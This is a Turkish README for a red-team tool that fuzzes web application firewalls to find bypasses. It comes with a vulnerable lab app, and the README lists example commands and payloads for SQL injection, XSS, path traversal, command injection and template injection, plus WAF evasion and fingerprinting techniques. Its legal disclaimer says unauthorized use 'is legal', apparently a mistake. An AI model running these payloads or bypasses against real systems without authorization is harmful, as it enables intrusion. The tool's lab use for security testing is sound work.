# WAFuZzor 🛡️

> **Red Team WAF Bypass Framework** — Mutation engine, WAF fingerprinting, bypass detection ve gerçekçi lab ortamı.

![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python)
![License](https://img.shields.io/badge/License-MIT-green)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey)
![Status](https://img.shields.io/badge/Status-Active-brightgreen)

---

## ⚠️ Yasal Uyarı

Bu araç **yalnızca yetkili penetrasyon testleri ve güvenlik araştırmaları** için tasarlanmıştır.  
İzinsiz sistemlere karşı kullanmak yasaldır. Kullanıcı tüm sorumluluğu kabul eder.

---

## 📦 İçerik

```
WAFuZzor/
├── waf_fuzzer_v2.py      # Ana fuzzer aracı
├── waf_lab_app.py        # Yerel test lab ortamı (Flask)
└── README.md
```

---

## 🔧 Kurulum

```bash
# Fuzzer için
pip install aiohttp rich

# Lab ortamı için
pip install flask markupsafe

# JS Challenge bypass için (opsiyonel)
pip install playwright
playwright install chromium
```

---

## 🚀 Hızlı Başlangıç

### 1. Lab Ortamını Başlat

```bash
python waf_lab_app.py --host 0.0.0.0 --port 5000 --waf cloudflare --rate 0
```

### 2. Fuzzer'ı Çalıştır

```bash
python waf_fuzzer_v2.py \
  -u "http://localhost:5000/search?q=FUZZ" \
  --context xss \
  -p '<script>alert(1)</script>'
```

---

## 🎯 waf_fuzzer_v2.py — Ana Araç

### Kullanım

```
usage: waf_fuzzer_v2.py [-h] -u URL (-p PAYLOAD | -w WORDLIST)
                        [-X METHOD] [-d DATA] [-H HEADER] [-c COOKIES]
                        [--proxy PROXY]
                        [--context {general,sqli,xss,cmdi,path,ssti}]
                        [--no-mutate] [--concurrency N]
                        [--rate-limit RATE_LIMIT] [--timeout TIMEOUT]
                        [--chunked] [--js-challenge] [--verbose]
                        [-o OUTPUT] [--output-payloads FILE]
                        [--force] [--benign STRING]
```

### Parametreler

| Parametre | Açıklama |
|---|---|
| `-u URL` | Hedef URL (`FUZZ` placeholder ile) |
| `-p PAYLOAD` | Tek payload |
| `-w WORDLIST` | Payload wordlist dosyası |
| `-X METHOD` | HTTP metodu (GET/POST/PUT) |
| `-d DATA` | POST body (`FUZZ` placeholder kullanılabilir) |
| `-H HEADER` | Özel header (`Key: Value`) |
| `-c COOKIES` | Cookie (`k=v;k2=v2`) |
| `--proxy` | Proxy URL (Burp Suite: `http://127.0.0.1:8080`) |
| `--context` | Zafiyet tipi: `general`, `sqli`, `xss`, `cmdi`, `path`, `ssti` |
| `--no-mutate` | Payload'ı olduğu gibi gönder, mutate etme |
| `--concurrency` | Eş zamanlı istek sayısı (varsayılan: 30) |
| `--rate-limit` | İstekler arası saniye (örn: `0.05`) |
| `--js-challenge` | Playwright ile JS challenge çöz |
| `-o OUTPUT` | JSON çıktı dosyası |
| `--output-payloads` | Başarılı bypass'ları `.txt` olarak kaydet |
| `--force` | Baseline başarısız olsa da devam et |

### Örnek Komutlar

```bash
# SQLi — Login formu
python waf_fuzzer_v2.py \
  -u "http://target.com/login" \
  -X POST \
  -d "username=FUZZ&password=x" \
  --context sqli \
  -p "' OR '1'='1'--" \
  --rate-limit 0.1

# XSS — Arama kutusu
python waf_fuzzer_v2.py \
  -u "http://target.com/search?q=FUZZ" \
  --context xss \
  -p '<script>alert(1)</script>' \
  --rate-limit 0.1

# Path Traversal
python waf_fuzzer_v2.py \
  -u "http://target.com/download?file=FUZZ" \
  --context path \
  -p "../../etc/passwd"

# Command Injection
python waf_fuzzer_v2.py \
  -u "http://target.com/ping?host=FUZZ" \
  --context cmdi \
  -p "127.0.0.1; id"

# SSTI — Jinja2/Twig
python waf_fuzzer_v2.py \
  -u "http://target.com/render?template=FUZZ" \
  --context ssti \
  -p "{{7*7}}"

# Wordlist + Burp Proxy + JSON çıktı
python waf_fuzzer_v2.py \
  -u "http://target.com/search?q=FUZZ" \
  -w /usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt \
  --context xss \
  --proxy http://127.0.0.1:8080 \
  -o results.json \
  --output-payloads bypasses.txt

# JS Challenge (Cloudflare bot koruması)
python waf_fuzzer_v2.py \
  -u "http://target.com/search?q=FUZZ" \
  --context xss \
  -p '<script>alert(1)</script>' \
  --js-challenge
```

---

## 🧬 Mutation Engine

Her payload için otomatik olarak **6 context × 80+ teknik** uygulanır:

### Encoding Teknikleri
| Teknik | Örnek |
|---|---|
| URL Encode (1/2/3 tur) | `%3Cscript%3E` → `%253Cscript%253E` |
| Hex (`\xNN`) | `\x3c\x73\x63\x72\x69\x70\x74\x3e` |
| Octal (`\NNN`) | `\074\163\143\162\151\160\164\076` |
| HTML Entity (decimal) | `&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;` |
| HTML Entity (hex) | `&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;` |
| Base64 | `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` |
| UTF-16 (`%uXXXX`) | `%u003c%u0073%u0063...` |
| Unicode Fullwidth | `＜ｓｃｒｉｐｔ＞` |

### Obfuscation Teknikleri
| Teknik | Örnek |
|---|---|
| Case permütasyon | `<ScRiPt>`, `<SCRIPT>`, `<sCrIpT>` |
| Null byte ekleme | `<script\x00>`, `%00<script>` |
| Comment injection | `<scr<!---->ipt>`, `'/*!*/OR/*!*/'` |
| Space substitution | `/**/`, `%09`, `%0A`, `%0D` |
| Unicode homoglif | `оR` (Cyrillic о), `ｉd` (fullwidth) |
| CRLF injection | `payload%0d%0aX-Injected: true` |
| HTTP Parameter Pollution | `param=x&param=PAYLOAD` |

### Context-Specific Mutasyonlar

**SQLi:**
- Operator substitution: `OR` → `||`, `AND` → `&&`
- MySQL comment bypass: `'/*!*/OR/*!*/'`
- Space bypass: `'+OR+'`, `'#\nOR#\n'`
- Time-based blind: `SLEEP(5)`, `BENCHMARK()`
- Hex literal: `0x27204f52...`

**XSS:**
- 30+ event handler: `onfocus`, `oninput`, `ondrag`...
- Data URI: `<img src=data:image/svg+xml;base64,...>`
- Template injection: `${alert(1)}`, `#{alert(1)}`
- Alternative tags: `<svg>`, `<audio>`, `<video>`, `<body>`

**CMDi:**
- Newline injection: `%0Aid`, `%0Awhoami`
- Subshell: `$(id)`, `` `whoami` ``
- Wildcard: `/???/??t /???/p?ss?d`, `/bin/c?t`
- IFS bypass: `${IFS}`
- Comment separator: `127.0.0.1;#\nid`

**Path Traversal:**
- Overlong UTF-8: `..%c0%af..%c0%af`
- Unicode slash: `../..／etc/passwd`
- Double-slash: `....//....//`
- PHP wrappers: `php://filter/convert.base64-encode/resource=`

**SSTI:**
- Jinja2: `{{7*7}}`, `{{config}}`, `{{_self.env...}}`
- Twig: `{{_self.env.registerUndefinedFilterCallback('exec')}}`
- Freemarker: `<#assign ex=...>`
- Velocity: `#set($x=...)`
- Thymeleaf: `*{7*7}`
- ERB: `<%= 7*7 %>`

---

## 🔍 Bypass Detection

5 sinyalli analiz sistemi — minimum 2 sinyal bypass sayılır:

| Sinyal | Açıklama |
|---|---|
| Status kodu | Blok status'undan farklı HTTP kodu |
| Body hash | SHA256 farklılaşması |
| Body boyutu | >%20 fark |
| Block keyword yok | WAF hata mesajı yok |
| Benign benzerliği | difflib > 0.65 |

---

## 🕵️ WAF Fingerprinting

10 WAF için imza tabanlı tespit:

| WAF | Tespit Yöntemi |
|---|---|
| **Cloudflare** | `CF-RAY`, `cf-cache-status` header |
| **ModSecurity** | `X-Mod-Security` header, body pattern |
| **Imperva** | `X-Iinfo`, `X-CDN: Imperva` |
| **Akamai** | `akamai-grn` header |
| **AWS WAF** | `x-amzn-requestid` |
| **F5 BIG-IP** | `x-wa-info` header |
| **Sucuri** | `x-sucuri-id` |
| **Barracuda** | `barracuda_*` cookie |
| **Wordfence** | `wfCBL` body pattern |
| **Nginx** | `x-nginx` header |

---

## 🏗️ waf_lab_app.py — Test Lab Ortamı

Gerçekçi bir e-ticaret sitesi (`ShopEasy`) görünümünde yerel WAF test ortamı.

### Başlatma

```bash
# Cloudflare modu (varsayılan)
python waf_lab_app.py --host 0.0.0.0 --port 5000

# ModSecurity modu — daha katı kurallar
python waf_lab_app.py --host 0.0.0.0 --waf modsec --rate 0

# Imperva modu
python waf_lab_app.py --host 0.0.0.0 --waf imperva

# WAF kapalı — baseline test
python waf_lab_app.py --host 0.0.0.0 --waf none --rate 0

# Tüm seçenekler
python waf_lab_app.py \
  --host 0.0.0.0 \
  --port 5000 \
  --waf cloudflare \     # cloudflare | modsec | imperva | none
  --rate 30 \            # req/dk (0=kapalı)
  --no-js \              # JS Challenge'ı kapat
  --debug                # WAF kararını X-WAF-Reason header'ında göster
```

### Zafiyetli Endpoint'ler

| Endpoint | Metod | Zafiyet | Test Payload |
|---|---|---|---|
| `/login` | POST | **SQL Injection** | `' OR '1'='1'--` |
| `/search?q=` | GET | **XSS (Reflected)** | `<script>alert(1)</script>` |
| `/download?file=` | GET | **Path Traversal** | `../../etc/passwd` |
| `/ping?host=` | GET | **Command Injection** | `127.0.0.1; id` |
| `/render?template=` | GET | **SSTI (Jinja2)** | `{{7*7}}` |
| `/api/data?id=` | GET | **SQLi (JSON API)** | `1 UNION SELECT 1,2,3--` |

### WAF Profil Karşılaştırması

Her profil farklı kural motoru kullanır:

| Özellik | Cloudflare | ModSecurity | Imperva |
|---|---|---|---|
| Decode derinliği | 1 tur | 3 tur | 2 tur |
| HTML entity decode | ❌ | ✅ | ❌ |
| Unicode normalize | ❌ | ✅ | ❌ |
| `\|\|` operatörü | ❌ | ✅ | ✅ |
| Comment obfuscation | ❌ | ✅ | ✅ |
| Base64 decode | ❌ | ❌ | ❌ |
| JS Challenge | ✅ | ❌ | ✅ |

### Admin Panel

`http://localhost:5000/admin` — Runtime'da WAF modunu değiştir.

---

## 📊 Test Sonuçları (Lab Ortamı)

Tek payload, tüm mutasyonlar, `--rate-limit 0.05`:

| Endpoint | Mutation | Cloudflare | ModSecurity | Imperva |
|---|---|---|---|---|
| SQLi `/login` | 97 | **22 bypass** | **9 bypass** ✅ | **18 bypass** |
| XSS `/search` | 104 | **9 bypass** | **9 bypass** | **9 bypass** |
| CMDi `/ping` | 210 | **33 bypass** | **33 bypass** | **48 bypass** ⚠️ |
| SSTI `/render` | 49 | **18 bypass** | **18 bypass** | **16 bypass** |
| Path `/download` | 114 | **15 bypass** | **15 bypass** | **22 bypass** |

**Bulgular:**
- ModSecurity, SQLi'de en iyi koruma (CF'den %59 daha az bypass)
- Imperva, CMDi'de en zayıf (`||`, `;` varyantlarını kaçırıyor)
- Base64 ve octal encoding tüm WAF'ların evrensel kör noktası
- SSTI koruması genel olarak yetersiz

---

## 🔗 VirtualBox / Kali Linux Kullanımı

```bash
# Host IP'yi bul (Kali'de)
ip route | grep default
# → default via 10.0.2.2 ...

# Lab'ı Windows host'ta başlat
python waf_lab_app.py --host 0.0.0.0 --port 5000

# Kali'den test et
python waf_fuzzer_v2.py \
  -u "http://10.0.2.2:5000/search?q=FUZZ" \
  --context xss \
  -p '<script>alert(1)</script>' \
  --rate-limit 0.1
```

---

## 🛠️ Gereksinimler

| Paket | Kullanım |
|---|---|
| `aiohttp` | Async HTTP istekleri |
| `rich` | Terminal UI, progress bar, tablo |
| `flask` | Lab sunucusu |
| `markupsafe` | Lab XSS simülasyonu |
| `playwright` | JS Challenge bypass (opsiyonel) |

---

## 📁 Önerilen Wordlist'ler

```bash
# Kali/SecLists
/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

# Kurulum
sudo apt install seclists
```

---

## 📄 Lisans

MIT License — Detaylar için `LICENSE` dosyasına bakın.

---

## 🤝 Katkı

Pull request ve issue'lar kabul edilir. Yeni WAF profili, mutation tekniği veya bypass detection sinyali eklemek için fork edin.
